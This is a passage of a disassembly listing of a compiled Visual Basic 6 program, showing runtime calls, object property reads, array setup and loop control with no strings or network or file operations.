007F5020: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F5025: mov eax, [ebp+08h]
007F5028: mov eax, [eax]
007F502A: push [ebp+08h]
007F502D: call [eax+00000344h]
007F5033: mov var_000000BC, eax
007F5039: mov var_000000C4, 00000009h
007F5043: lea esi, var_000000C4
007F5049: push 00000001h
007F504B: push var_00000148
007F5051: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5056: mov ecx, eax
007F5058: mov edx, esi
007F505A: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F505F: mov eax, [ebp+08h]
007F5062: mov eax, [eax]
007F5064: push [ebp+08h]
007F5067: call [eax+00000340h]
007F506D: mov var_000000CC, eax
007F5073: mov var_000000D4, 00000009h
007F507D: lea esi, var_000000D4
007F5083: push 00000002h
007F5085: push var_00000148
007F508B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5090: mov ecx, eax
007F5092: mov edx, esi
007F5094: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5099: mov eax, [ebp+08h]
007F509C: mov eax, [eax]
007F509E: push [ebp+08h]
007F50A1: call [eax+0000033Ch]
007F50A7: mov var_000000DC, eax
007F50AD: mov var_000000E4, 00000009h
007F50B7: lea esi, var_000000E4
007F50BD: push 00000003h
007F50BF: push var_00000148
007F50C5: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F50CA: mov ecx, eax
007F50CC: mov edx, esi
007F50CE: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F50D3: lea eax, var_34
007F50D6: mov var_00000170, eax
007F50DC: mov var_00000178, 00004003h
007F50E6: lea esi, var_00000178
007F50EC: push 00000004h
007F50EE: push var_00000148
007F50F4: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F50F9: mov ecx, eax
007F50FB: mov edx, esi
007F50FD: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5102: lea eax, var_44
007F5105: mov var_00000180, eax
007F510B: mov var_00000188, 00004008h
007F5115: lea esi, var_00000188
007F511B: push 00000005h
007F511D: push var_00000148
007F5123: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5128: mov ecx, eax
007F512A: mov edx, esi
007F512C: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5131: mov edx, 0043D464h ; x7
007F5136: lea ecx, var_58
007F5139: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F513E: lea eax, var_00000148
007F5144: push eax
007F5145: lea eax, var_58
007F5148: push eax
007F5149: fld real8 ptr var_000001E4
007F514F: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F5154: push eax
007F5155: call 007A6910h
007F515A: lea eax, var_00000148
007F5160: push eax
007F5161: push 00000000h
007F5163: call 00410934h ; Erase
007F5168: lea eax, var_58
007F516B: push eax
007F516C: lea eax, var_54
007F516F: push eax
007F5170: push 00000002h
007F5172: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F5177: add esp, 0000000Ch
007F517A: lea eax, var_78
007F517D: push eax
007F517E: lea eax, var_74
007F5181: push eax
007F5182: lea eax, var_70
007F5185: push eax
007F5186: push 00000003h
007F5188: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F518D: add esp, 00000010h
007F5190: lea eax, var_000000B4
007F5196: push eax
007F5197: lea eax, var_000000A4
007F519D: push eax
007F519E: lea eax, var_00000094
007F51A4: push eax
007F51A5: push 00000003h
007F51A7: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F51AC: add esp, 00000010h
007F51AF: mov var_04, 000000A1h
007F51B6: or word ptr [008F24A4h], FFFFh
007F51BE: mov var_04, 000000A3h
007F51C5: mov eax, [ebp+08h]
007F51C8: mov eax, [eax]
007F51CA: push [ebp+08h]
007F51CD: call [eax+00000380h]
007F51D3: push eax
007F51D4: lea eax, var_70
007F51D7: push eax
007F51D8: call 00410A84h ; Set (object)
007F51DD: mov var_000001F0, eax
007F51E3: lea eax, var_74
007F51E6: push eax
007F51E7: push 00000001h
007F51E9: mov eax, var_000001F0
007F51EF: mov eax, [eax]
007F51F1: push var_000001F0
007F51F7: call [eax+40h]
007F51FA: fclex 
007F51FC: mov var_000001F4, eax
007F5202: cmp var_000001F4, 00000000h
007F5209: jnl 7F522Bh
007F520B: push 00000040h
007F520D: push 00440DE8h
007F5212: push var_000001F0
007F5218: push var_000001F4
007F521E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F5223: mov var_00000578, eax
007F5229: jmp 7F5232h
007F522B: and var_00000578, 00000000h
007F5232: push 00000000h
007F5234: push 00000000h
007F5236: push var_74
007F5239: lea eax, var_00000094
007F523F: push eax
007F5240: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5245: add esp, 00000010h
007F5248: push eax
007F5249: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F524E: sub ax, FFFFh
007F5252: neg ax
007F5255: sbb eax, eax
007F5257: inc eax
007F5258: neg eax
007F525A: mov var_000001F8, ax
007F5261: lea eax, var_74
007F5264: push eax
007F5265: lea eax, var_70
007F5268: push eax
007F5269: push 00000002h
007F526B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F5270: add esp, 0000000Ch
007F5273: lea ecx, var_00000094
007F5279: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F527E: movsx eax, word ptr var_000001F8
007F5285: test eax, eax
007F5287: jz 007F5575h
007F528D: mov var_04, 000000A4h
007F5294: lea eax, var_30
007F5297: mov var_00000150, eax
007F529D: mov var_00000158, 0000400Ch
007F52A7: cmp [008F2010h], 00000000h
007F52AE: jnz 7F52CBh
007F52B0: push 008F2010h
007F52B5: push 00433984h
007F52BA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F52BF: mov var_0000057C, 008F2010h
007F52C9: jmp 7F52D5h
007F52CB: mov var_0000057C, 008F2010h
007F52D5: push 00000000h
007F52D7: push 00000014h
007F52D9: push 00440E58h
007F52DE: push 00000010h
007F52E0: pop eax
007F52E1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F52E6: lea esi, var_00000158
007F52EC: mov edi, esp
007F52EE: movsd 
007F52EF: movsd 
007F52F0: movsd 
007F52F1: movsd 
007F52F2: push 00000001h
007F52F4: push 00000000h
007F52F6: push 00440E48h
007F52FB: push 00000000h
007F52FD: push 00000018h
007F52FF: mov eax, var_0000057C
007F5305: mov eax, [eax]
007F5307: mov ecx, var_0000057C
007F530D: mov ecx, [ecx]
007F530F: mov ecx, [ecx]
007F5311: push eax
007F5312: call [ecx+0000054Ch]
007F5318: push eax
007F5319: lea eax, var_70
007F531C: push eax
007F531D: call 00410A84h ; Set (object)
007F5322: push eax
007F5323: lea eax, var_00000094
007F5329: push eax
007F532A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F532F: add esp, 00000010h
007F5332: push eax
007F5333: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F5338: push eax
007F5339: lea eax, var_74
007F533C: push eax
007F533D: call 00410A84h ; Set (object)
007F5342: push eax
007F5343: lea eax, var_000000A4
007F5349: push eax
007F534A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F534F: add esp, 00000020h
007F5352: push eax
007F5353: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F5358: push eax
007F5359: lea eax, var_78
007F535C: push eax
007F535D: call 00410A84h ; Set (object)
007F5362: push eax
007F5363: lea eax, var_000000B4
007F5369: push eax
007F536A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F536F: add esp, 00000010h
007F5372: push eax
007F5373: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F5378: mov edx, eax
007F537A: lea ecx, var_54
007F537D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F5382: push eax
007F5383: call 004109DCh ; Val(arg_1)
007F5388: fstp real8 ptr var_000001E4
007F538E: push 00000000h
007F5390: push 00000005h
007F5392: push 00000001h
007F5394: push 00000000h
007F5396: lea eax, var_00000148
007F539C: push eax
007F539D: push 00000010h
007F539F: push 00000880h
007F53A4: call 00410946h ; ReDim
007F53A9: add esp, 0000001Ch
007F53AC: mov var_00000160, 00447594h
007F53B6: mov var_00000168, 00000008h
007F53C0: lea esi, var_00000168
007F53C6: push 00000000h
007F53C8: push var_00000148
007F53CE: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F53D3: mov ecx, eax
007F53D5: mov edx, esi
007F53D7: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F53DC: mov eax, [ebp+08h]
007F53DF: mov eax, [eax]
007F53E1: push [ebp+08h]
007F53E4: call [eax+00000344h]
007F53EA: mov var_000000BC, eax
007F53F0: mov var_000000C4, 00000009h
007F53FA: lea esi, var_000000C4
007F5400: push 00000001h
007F5402: push var_00000148
007F5408: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F540D: mov ecx, eax
007F540F: mov edx, esi
007F5411: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5416: mov eax, [ebp+08h]
007F5419: mov eax, [eax]
007F541B: push [ebp+08h]
007F541E: call [eax+00000340h]
007F5424: mov var_000000CC, eax
007F542A: mov var_000000D4, 00000009h
007F5434: lea esi, var_000000D4
007F543A: push 00000002h
007F543C: push var_00000148
007F5442: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5447: mov ecx, eax
007F5449: mov edx, esi
007F544B: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5450: mov eax, [ebp+08h]
007F5453: mov eax, [eax]
007F5455: push [ebp+08h]
007F5458: call [eax+0000033Ch]
007F545E: mov var_000000DC, eax
007F5464: mov var_000000E4, 00000009h
007F546E: lea esi, var_000000E4
007F5474: push 00000003h
007F5476: push var_00000148
007F547C: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5481: mov ecx, eax
007F5483: mov edx, esi
007F5485: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F548A: lea eax, var_34
007F548D: mov var_00000170, eax
007F5493: mov var_00000178, 00004003h
007F549D: lea esi, var_00000178
007F54A3: push 00000004h
007F54A5: push var_00000148
007F54AB: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F54B0: mov ecx, eax
007F54B2: mov edx, esi
007F54B4: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F54B9: lea eax, var_44
007F54BC: mov var_00000180, eax
007F54C2: mov var_00000188, 00004008h
007F54CC: lea esi, var_00000188
007F54D2: push 00000005h
007F54D4: push var_00000148
007F54DA: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F54DF: mov ecx, eax
007F54E1: mov edx, esi
007F54E3: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F54E8: mov edx, 0043D464h ; x7
007F54ED: lea ecx, var_58
007F54F0: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F54F5: lea eax, var_00000148
007F54FB: push eax
007F54FC: lea eax, var_58
007F54FF: push eax
007F5500: fld real8 ptr var_000001E4
007F5506: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F550B: push eax
007F550C: call 007A6910h
007F5511: lea eax, var_00000148
007F5517: push eax
007F5518: push 00000000h
007F551A: call 00410934h ; Erase
007F551F: lea eax, var_58
007F5522: push eax
007F5523: lea eax, var_54
007F5526: push eax
007F5527: push 00000002h
007F5529: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F552E: add esp, 0000000Ch
007F5531: lea eax, var_78
007F5534: push eax
007F5535: lea eax, var_74
007F5538: push eax
007F5539: lea eax, var_70
007F553C: push eax
007F553D: push 00000003h
007F553F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F5544: add esp, 00000010h
007F5547: lea eax, var_000000B4
007F554D: push eax
007F554E: lea eax, var_000000A4
007F5554: push eax
007F5555: lea eax, var_00000094
007F555B: push eax
007F555C: push 00000003h
007F555E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F5563: add esp, 00000010h
007F5566: mov var_04, 000000A5h
007F556D: and word ptr [008F24A4h], 0000h
007F5575: mov var_04, 000000A8h
007F557C: lea eax, var_00000380
007F5582: push eax
007F5583: lea eax, var_00000370
007F5589: push eax
007F558A: lea eax, var_30
007F558D: push eax
007F558E: call 00410A36h ; Next
007F5593: mov var_000003E4, eax
007F5599: cmp var_000003E4, 00000000h
007F55A0: jnz 007F4CC5h
007F55A6: jmp 007F5FC0h
007F55AB: mov var_04, 000000AAh
007F55B2: mov var_00000150, 00000001h
007F55BC: mov var_00000158, 00000002h
007F55C6: cmp [008F2010h], 00000000h
007F55CD: jnz 7F55EAh
007F55CF: push 008F2010h
007F55D4: push 00433984h
007F55D9: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F55DE: mov var_00000580, 008F2010h
007F55E8: jmp 7F55F4h
007F55EA: mov var_00000580, 008F2010h
007F55F4: push 00000000h
007F55F6: push 00000001h
007F55F8: push 00440E48h
007F55FD: push 00000000h
007F55FF: push 00000018h
007F5601: mov eax, var_00000580
007F5607: mov eax, [eax]
007F5609: mov ecx, var_00000580
007F560F: mov ecx, [ecx]
007F5611: mov ecx, [ecx]
007F5613: push eax
007F5614: call [ecx+00000550h]
007F561A: push eax
007F561B: lea eax, var_70
007F561E: push eax
007F561F: call 00410A84h ; Set (object)
007F5624: push eax
007F5625: lea eax, var_00000094
007F562B: push eax
007F562C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5631: add esp, 00000010h
007F5634: push eax
007F5635: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F563A: push eax
007F563B: lea eax, var_74
007F563E: push eax
007F563F: call 00410A84h ; Set (object)
007F5644: push eax
007F5645: lea eax, var_000000A4
007F564B: push eax
007F564C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5651: add esp, 00000010h
007F5654: push eax
007F5655: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F565A: mov var_00000160, eax
007F5660: mov var_00000168, 00000003h
007F566A: mov var_00000170, 00000001h
007F5674: mov var_00000178, 00000002h
007F567E: lea eax, var_00000158
007F5684: push eax
007F5685: lea eax, var_00000168
007F568B: push eax
007F568C: lea eax, var_00000178
007F5692: push eax
007F5693: lea eax, var_000003A0
007F5699: push eax
007F569A: lea eax, var_00000390
007F56A0: push eax
007F56A1: lea eax, var_30
007F56A4: push eax
007F56A5: call 00410A3Ch ; For
007F56AA: mov var_000003E8, eax
007F56B0: lea eax, var_74
007F56B3: push eax
007F56B4: lea eax, var_70
007F56B7: push eax
007F56B8: push 00000002h
007F56BA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F56BF: add esp, 0000000Ch
007F56C2: lea eax, var_000000A4
007F56C8: push eax
007F56C9: lea eax, var_00000094
007F56CF: push eax
007F56D0: push 00000002h
007F56D2: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F56D7: add esp, 0000000Ch
007F56DA: jmp 007F5FB3h
007F56DF: mov var_04, 000000ABh
007F56E6: lea eax, var_30
007F56E9: mov var_00000150, eax
007F56EF: mov var_00000158, 0000400Ch
007F56F9: cmp [008F2010h], 00000000h
007F5700: jnz 7F571Dh
007F5702: push 008F2010h
007F5707: push 00433984h
007F570C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F5711: mov var_00000584, 008F2010h
007F571B: jmp 7F5727h
007F571D: mov var_00000584, 008F2010h
007F5727: push 00000000h
007F5729: push 00000004h
007F572B: push 00440E58h
007F5730: push 00000010h
007F5732: pop eax
007F5733: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F5738: lea esi, var_00000158
007F573E: mov edi, esp
007F5740: movsd 
007F5741: movsd 
007F5742: movsd 
007F5743: movsd 
007F5744: push 00000001h
007F5746: push 00000000h
007F5748: push 00440E48h
007F574D: push 00000000h
007F574F: push 00000018h
007F5751: mov eax, var_00000584
007F5757: mov eax, [eax]
007F5759: mov ecx, var_00000584
007F575F: mov ecx, [ecx]
007F5761: mov ecx, [ecx]
007F5763: push eax
007F5764: call [ecx+00000550h]
007F576A: push eax
007F576B: lea eax, var_70
007F576E: push eax
007F576F: call 00410A84h ; Set (object)
007F5774: push eax
007F5775: lea eax, var_00000094
007F577B: push eax
007F577C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5781: add esp, 00000010h
007F5784: push eax
007F5785: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F578A: push eax
007F578B: lea eax, var_74
007F578E: push eax
007F578F: call 00410A84h ; Set (object)
007F5794: push eax
007F5795: lea eax, var_000000A4
007F579B: push eax
007F579C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F57A1: add esp, 00000020h
007F57A4: push eax
007F57A5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F57AA: push eax
007F57AB: lea eax, var_78
007F57AE: push eax
007F57AF: call 00410A84h ; Set (object)
007F57B4: push eax
007F57B5: lea eax, var_000000B4
007F57BB: push eax
007F57BC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F57C1: add esp, 00000010h
007F57C4: push eax
007F57C5: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F57CA: sub ax, FFFFh
007F57CE: neg ax
007F57D1: sbb eax, eax
007F57D3: inc eax
007F57D4: neg eax
007F57D6: mov var_000001F0, ax
007F57DD: lea eax, var_78
007F57E0: push eax
007F57E1: lea eax, var_74
007F57E4: push eax
007F57E5: lea eax, var_70
007F57E8: push eax
007F57E9: push 00000003h
007F57EB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F57F0: add esp, 00000010h
007F57F3: lea eax, var_000000B4
007F57F9: push eax
007F57FA: lea eax, var_000000A4
007F5800: push eax
007F5801: lea eax, var_00000094
007F5807: push eax
007F5808: push 00000003h
007F580A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F580F: add esp, 00000010h
007F5812: movsx eax, word ptr var_000001F0
007F5819: test eax, eax
007F581B: jz 007F5F8Fh
007F5821: mov var_04, 000000ACh
007F5828: mov eax, [ebp+08h]
007F582B: mov eax, [eax]
007F582D: push [ebp+08h]
007F5830: call [eax+00000380h]
007F5836: push eax
007F5837: lea eax, var_70
007F583A: push eax
007F583B: call 00410A84h ; Set (object)
007F5840: mov var_000001F0, eax
007F5846: lea eax, var_74
007F5849: push eax
007F584A: push 00000000h
007F584C: mov eax, var_000001F0
007F5852: mov eax, [eax]
007F5854: push var_000001F0
007F585A: call [eax+40h]
007F585D: fclex 
007F585F: mov var_000001F4, eax
007F5865: cmp var_000001F4, 00000000h
007F586C: jnl 7F588Eh
007F586E: push 00000040h
007F5870: push 00440DE8h
007F5875: push var_000001F0
007F587B: push var_000001F4
007F5881: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F5886: mov var_00000588, eax
007F588C: jmp 7F5895h
007F588E: and var_00000588, 00000000h
007F5895: push 00000000h
007F5897: push 00000000h
007F5899: push var_74
007F589C: lea eax, var_00000094
007F58A2: push eax
007F58A3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F58A8: add esp, 00000010h
007F58AB: push eax
007F58AC: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F58B1: sub ax, FFFFh
007F58B5: neg ax
007F58B8: sbb eax, eax
007F58BA: inc eax
007F58BB: neg eax
007F58BD: mov var_000001F8, ax
007F58C4: lea eax, var_74
007F58C7: push eax
007F58C8: lea eax, var_70
007F58CB: push eax
007F58CC: push 00000002h
007F58CE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F58D3: add esp, 0000000Ch
007F58D6: lea ecx, var_00000094
007F58DC: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F58E1: movsx eax, word ptr var_000001F8
007F58E8: test eax, eax
007F58EA: jz 007F5BD8h
007F58F0: mov var_04, 000000ADh
007F58F7: lea eax, var_30
007F58FA: mov var_00000150, eax
007F5900: mov var_00000158, 0000400Ch
007F590A: cmp [008F2010h], 00000000h
007F5911: jnz 7F592Eh
007F5913: push 008F2010h
007F5918: push 00433984h
007F591D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F5922: mov var_0000058C, 008F2010h
007F592C: jmp 7F5938h
007F592E: mov var_0000058C, 008F2010h
007F5938: push 00000000h
007F593A: push 00000014h
007F593C: push 00440E58h
007F5941: push 00000010h
007F5943: pop eax
007F5944: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F5949: lea esi, var_00000158
007F594F: mov edi, esp
007F5951: movsd 
007F5952: movsd 
007F5953: movsd 
007F5954: movsd 
007F5955: push 00000001h
007F5957: push 00000000h
007F5959: push 00440E48h
007F595E: push 00000000h
007F5960: push 00000018h
007F5962: mov eax, var_0000058C
007F5968: mov eax, [eax]
007F596A: mov ecx, var_0000058C
007F5970: mov ecx, [ecx]
007F5972: mov ecx, [ecx]
007F5974: push eax
007F5975: call [ecx+00000550h]
007F597B: push eax
007F597C: lea eax, var_70
007F597F: push eax
007F5980: call 00410A84h ; Set (object)
007F5985: push eax
007F5986: lea eax, var_00000094
007F598C: push eax
007F598D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5992: add esp, 00000010h
007F5995: push eax
007F5996: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F599B: push eax
007F599C: lea eax, var_74
007F599F: push eax
007F59A0: call 00410A84h ; Set (object)
007F59A5: push eax
007F59A6: lea eax, var_000000A4
007F59AC: push eax
007F59AD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F59B2: add esp, 00000020h
007F59B5: push eax
007F59B6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F59BB: push eax
007F59BC: lea eax, var_78
007F59BF: push eax
007F59C0: call 00410A84h ; Set (object)
007F59C5: push eax
007F59C6: lea eax, var_000000B4
007F59CC: push eax
007F59CD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F59D2: add esp, 00000010h
007F59D5: push eax
007F59D6: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F59DB: mov edx, eax
007F59DD: lea ecx, var_54
007F59E0: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F59E5: push eax
007F59E6: call 004109DCh ; Val(arg_1)
007F59EB: fstp real8 ptr var_000001E4
007F59F1: push 00000000h
007F59F3: push 00000005h
007F59F5: push 00000001h
007F59F7: push 00000000h
007F59F9: lea eax, var_00000148
007F59FF: push eax
007F5A00: push 00000010h
007F5A02: push 00000880h
007F5A07: call 00410946h ; ReDim
007F5A0C: add esp, 0000001Ch
007F5A0F: mov var_00000160, 00442938h
007F5A19: mov var_00000168, 00000008h
007F5A23: lea esi, var_00000168
007F5A29: push 00000000h
007F5A2B: push var_00000148
007F5A31: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5A36: mov ecx, eax
007F5A38: mov edx, esi
007F5A3A: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F5A3F: mov eax, [ebp+08h]
007F5A42: mov eax, [eax]
007F5A44: push [ebp+08h]
007F5A47: call [eax+00000344h]
007F5A4D: mov var_000000BC, eax
007F5A53: mov var_000000C4, 00000009h
007F5A5D: lea esi, var_000000C4
007F5A63: push 00000001h
007F5A65: push var_00000148
007F5A6B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5A70: mov ecx, eax
007F5A72: mov edx, esi
007F5A74: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5A79: mov eax, [ebp+08h]
007F5A7C: mov eax, [eax]
007F5A7E: push [ebp+08h]
007F5A81: call [eax+00000340h]
007F5A87: mov var_000000CC, eax
007F5A8D: mov var_000000D4, 00000009h
007F5A97: lea esi, var_000000D4
007F5A9D: push 00000002h
007F5A9F: push var_00000148
007F5AA5: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5AAA: mov ecx, eax
007F5AAC: mov edx, esi
007F5AAE: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5AB3: mov eax, [ebp+08h]
007F5AB6: mov eax, [eax]
007F5AB8: push [ebp+08h]
007F5ABB: call [eax+0000033Ch]
007F5AC1: mov var_000000DC, eax
007F5AC7: mov var_000000E4, 00000009h
007F5AD1: lea esi, var_000000E4
007F5AD7: push 00000003h
007F5AD9: push var_00000148
007F5ADF: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5AE4: mov ecx, eax
007F5AE6: mov edx, esi
007F5AE8: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5AED: lea eax, var_34
007F5AF0: mov var_00000170, eax
007F5AF6: mov var_00000178, 00004003h
007F5B00: lea esi, var_00000178
007F5B06: push 00000004h
007F5B08: push var_00000148
007F5B0E: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5B13: mov ecx, eax
007F5B15: mov edx, esi
007F5B17: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5B1C: lea eax, var_44
007F5B1F: mov var_00000180, eax
007F5B25: mov var_00000188, 00004008h
007F5B2F: lea esi, var_00000188
007F5B35: push 00000005h
007F5B37: push var_00000148
007F5B3D: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F5B42: mov ecx, eax
007F5B44: mov edx, esi
007F5B46: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F5B4B: mov edx, 0043D464h ; x7
007F5B50: lea ecx, var_58
007F5B53: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F5B58: lea eax, var_00000148
007F5B5E: push eax
007F5B5F: lea eax, var_58
007F5B62: push eax
007F5B63: fld real8 ptr var_000001E4
007F5B69: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F5B6E: push eax
007F5B6F: call 007A6910h
007F5B74: lea eax, var_00000148
007F5B7A: push eax
007F5B7B: push 00000000h
007F5B7D: call 00410934h ; Erase
007F5B82: lea eax, var_58
007F5B85: push eax
007F5B86: lea eax, var_54
007F5B89: push eax
007F5B8A: push 00000002h
007F5B8C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F5B91: add esp, 0000000Ch
007F5B94: lea eax, var_78
007F5B97: push eax
007F5B98: lea eax, var_74
007F5B9B: push eax
007F5B9C: lea eax, var_70
007F5B9F: push eax
007F5BA0: push 00000003h
007F5BA2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F5BA7: add esp, 00000010h
007F5BAA: lea eax, var_000000B4
007F5BB0: push eax
007F5BB1: lea eax, var_000000A4
007F5BB7: push eax
007F5BB8: lea eax, var_00000094
007F5BBE: push eax
007F5BBF: push 00000003h
007F5BC1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F5BC6: add esp, 00000010h
007F5BC9: mov var_04, 000000AEh
007F5BD0: or word ptr [008F24A4h], FFFFh
007F5BD8: mov var_04, 000000B0h
007F5BDF: mov eax, [ebp+08h]
007F5BE2: mov eax, [eax]
007F5BE4: push [ebp+08h]
007F5BE7: call [eax+00000380h]
007F5BED: push eax
007F5BEE: lea eax, var_70
007F5BF1: push eax
007F5BF2: call 00410A84h ; Set (object)
007F5BF7: mov var_000001F0, eax
007F5BFD: lea eax, var_74
007F5C00: push eax
007F5C01: push 00000001h
007F5C03: mov eax, var_000001F0
007F5C09: mov eax, [eax]
007F5C0B: push var_000001F0
007F5C11: call [eax+40h]
007F5C14: fclex 
007F5C16: mov var_000001F4, eax
007F5C1C: cmp var_000001F4, 00000000h
007F5C23: jnl 7F5C45h
007F5C25: push 00000040h
007F5C27: push 00440DE8h
007F5C2C: push var_000001F0
007F5C32: push var_000001F4
007F5C38: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F5C3D: mov var_00000590, eax
007F5C43: jmp 7F5C4Ch
007F5C45: and var_00000590, 00000000h
007F5C4C: push 00000000h
007F5C4E: push 00000000h
007F5C50: push var_74
007F5C53: lea eax, var_00000094
007F5C59: push eax
007F5C5A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F5C5F: add esp, 00000010h
007F5C62: push eax
007F5C63: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F5C68: sub ax, FFFFh
007F5C6C: neg ax
007F5C6F: sbb eax, eax
007F5C71: inc eax
007F5C72: neg eax
007F5C74: mov var_000001F8, ax
007F5C7B: lea eax, var_74
007F5C7E: push eax
007F5C7F: lea eax, var_70
007F5C82: push eax
007F5C83: push 00000002h
007F5C85: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F5C8A: add esp, 0000000Ch
007F5C8D: lea ecx, var_00000094
007F5C93: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F5C98: movsx eax, word ptr var_000001F8
007F5C9F: test eax, eax
007F5CA1: jz 007F5F8Fh
007F5CA7: mov var_04, 000000B1h
007F5CAE: lea eax, var_30
007F5CB1: mov var_00000150, eax
007F5CB7: mov var_00000158, 0000400Ch
007F5CC1: cmp [008F2010h], 00000000h
007F5CC8: jnz 7F5CE5h
007F5CCA: push 008F2010h
007F5CCF: push 00433984h
007F5CD4: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F5CD9: mov var_00000594, 008F2010h
007F5CE3: jmp 7F5CEFh
007F5CE5: mov var_00000594, 008F2010h
007F5CEF: push 00000000h
007F5CF1: push 00000014h
007F5CF3: push 00440E58h
007F5CF8: push 00000010h
007F5CFA: pop eax
007F5CFB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F5D00: lea esi, var_00000158
007F5D06: mov edi, esp
007F5D08: movsd 
007F5D09: movsd 
007F5D0A: movsd 
007F5D0B: movsd 
007F5D0C: push 00000001h
007F5D0E: push 00000000h
007F5D10: push 00440E48h
007F5D15: push 00000000h
007F5D17: push 00000018h
007F5D19: mov eax, var_00000594
